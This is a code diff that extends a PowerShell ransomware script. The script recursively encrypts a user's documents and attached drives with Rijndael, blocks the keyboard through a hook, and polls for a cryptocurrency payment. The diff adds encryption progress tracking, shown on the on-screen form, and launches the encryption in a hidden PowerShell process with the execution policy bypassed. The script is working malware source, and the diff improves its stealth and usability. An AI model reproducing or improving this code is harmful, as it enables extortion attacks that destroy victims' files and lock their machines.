@@ -29,6 +29,7 @@ $RijndaelKey = $null
 $RijndaelIV = $null
 $KeyPath = "$env:TEMP\system.key"
 $EncryptedFilesList = "$env:TEMP\encrypted_files.txt"
+$ProgressStateFile = "$env:TEMP\encryption_progress.json"
 
 function Generate-RijndaelKey {
     $rijndael = New-Object System.Security.Cryptography.RijndaelManaged
@@ -130,7 +131,7 @@ function Get-LTCPrice {
 
 function Invoke-Ransomware {
     $rijndael = Generate-RijndaelKey
-    
+
     $encryptedFiles = @()
     $targetFolders = @(
         "$env:USERPROFILE\Documents",
@@ -153,25 +154,67 @@ function Invoke-Ransomware {
         "E:\",
         "F:\"
     )
-    
+
     $excludedExtensions = @(".exe", ".jar", ".dll", ".sys", ".ini", ".key", ".msi", ".bat", ".cmd", ".ps1")
-    
+
+    # Collect all candidate files first to calculate total
+    $candidateFiles = @()
     foreach ($folder in $targetFolders) {
         if (Test-Path $folder) {
             Get-ChildItem -Path $folder -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
-                if ($excludedExtensions -notcontains $_.Extension.ToLower()) {
-                    if ($_.Name -ne "system.key" -and $_.Extension -ne ".encrypted") {
-                        if (Encrypt-File -FilePath $_.FullName -Rijndael $rijndael) {
-                            $encryptedFiles += $_.FullName
-                        }
-                    }
+                if ($excludedExtensions -notcontains $_.Extension.ToLower() -and $_.Name -ne "system.key" -and $_.Extension -ne ".encrypted") {
+                    $candidateFiles += $_.FullName
                 }
             }
         }
     }
-    
+
+    $totalFiles = $candidateFiles.Count
+    $processed = 0
+    $startTime = Get-Date
+
+    $progressState = [PSCustomObject]@{
+        Total = $totalFiles
+        Processed = 0
+        Encrypted = 0
+        StartTime = $startTime
+        ElapsedSeconds = 0
+        RemainingSeconds = 0
+        Status = 'Running'
+    }
+    $progressState | ConvertTo-Json | Set-Content $ProgressStateFile -Force
+
+    Write-Host "[DEBUG] Found $totalFiles files to process. Starting encryption..."
+
+    foreach ($filePath in $candidateFiles) {
+        $processed++
+        $elapsed = New-TimeSpan -Start $startTime
+        $rate = if ($elapsed.TotalSeconds -gt 0) { $processed / $elapsed.TotalSeconds } else { 0 }
+        $remaining = if ($rate -gt 0) { [TimeSpan]::FromSeconds(($totalFiles - $processed) / $rate) } else { [TimeSpan]::FromSeconds(0) }
+
+        $percent = if ($totalFiles -gt 0) { [math]::Round(($processed / $totalFiles) * 100, 1) } else { 100 }
+        Write-Progress -Activity "Encrypting files" -Status "$processed/$totalFiles encrypted" -PercentComplete $percent -CurrentOperation $filePath
+
+        if (Encrypt-File -FilePath $filePath -Rijndael $rijndael) {
+            $encryptedFiles += $filePath
+        }
+
+        $progressState.Processed = $processed
+        $progressState.Encrypted = $encryptedFiles.Count
+        $progressState.ElapsedSeconds = [math]::Round($elapsed.TotalSeconds, 0)
+        $progressState.RemainingSeconds = [math]::Round($remaining.TotalSeconds,0)
+        $progressState | ConvertTo-Json | Set-Content $ProgressStateFile -Force
+
+        Write-Host "[DEBUG] $processed/$totalFiles done; elapsed: $($elapsed.ToString('hh\:mm\:ss')); remaining ~ $($remaining.ToString('hh\:mm\:ss'))"
+    }
+
+    $progressState.Status = 'Complete'
+    $progressState | ConvertTo-Json | Set-Content $ProgressStateFile -Force
+
+    Write-Host "[DEBUG] Encryption complete. $processed total attempted, $($encryptedFiles.Count) successfully encrypted."
     $encryptedFiles | Out-File $EncryptedFilesList -Force
 }
+
 
 function Invoke-Revert {
     $rijndael = Get-KeyFromFile
@@ -202,6 +245,18 @@ function Invoke-PaymentCheck {
         }
         Start-Sleep -Seconds 60
     }
+}
+
+function Get-EncryptionProgress {
+    if (Test-Path $ProgressStateFile) {
+        try {
+            return Get-Content $ProgressStateFile -Raw | ConvertFrom-Json
+        }
+        catch {
+            return $null
+        }
+    }
+    return $null
 }
 
 $hook = [Blocker+KeyboardHookProc] { param($n,$w,$l) return [IntPtr]1 }
@@ -302,8 +357,12 @@ switch ($Command.ToLower()) {
     "check" {
         Invoke-PaymentCheck
     }
-    default {
+    "encrypt" {
         Invoke-Ransomware
+        exit
+    }
+    default {
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -Command encrypt" -WindowStyle Hidden
         Start-Job -ScriptBlock ${function:Invoke-PaymentCheck}
     }
 }
@@ -336,6 +395,14 @@ $rimbalzo.AutoSize = $true
 $rimbalzo.Location = [Drawing.Point]::new(100, 100)
 $form.Controls.Add($rimbalzo)
 
+$statusLabel = New-Object Windows.Forms.Label
+$statusLabel.Text = "Progress: waiting for encryption thread..."
+$statusLabel.Font = New-Object Drawing.Font("Arial", 18, [Drawing.FontStyle]::Bold)
+$statusLabel.ForeColor = "White"
+$statusLabel.AutoSize = $true
+$statusLabel.Location = [Drawing.Point]::new(20, 20)
+$form.Controls.Add($statusLabel)
+
 $dx = 7
 $dy = 5
 $colors = @("Red","Orange","Yellow","Green","Cyan","Blue","Magenta","Purple","Pink","Lime")
@@ -353,6 +420,18 @@ $lampeggioTimer.Start()
 $timer = New-Object Windows.Forms.Timer
 $timer.Interval = 30
 $timer.Add_Tick({
+    $progress = Get-EncryptionProgress
+    if ($progress) {
+        $statusText = "Encrypted: $($progress.Encrypted)/$($progress.Total) | Processed: $($progress.Processed)/$($progress.Total)"
+        if ($progress.Status -eq 'Running') {
+            $remaining = [TimeSpan]::FromSeconds($progress.RemainingSeconds)
+            $statusText += " | Elapsed: $(New-TimeSpan -Seconds $progress.ElapsedSeconds).ToString('hh\:mm\:ss') | ETA: $($remaining.ToString('hh\:mm\:ss'))"
+        } else {
+            $statusText += " | Complete"
+        }
+        $statusLabel.Text = $statusText
+    }
+
     $x = $rimbalzo.Location.X + $dx
     $y = $rimbalzo.Location.Y + $dy
     if($x -lt 0 -or $x -gt ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width) - $rimbalzo.Width) { $dx = -$dx }
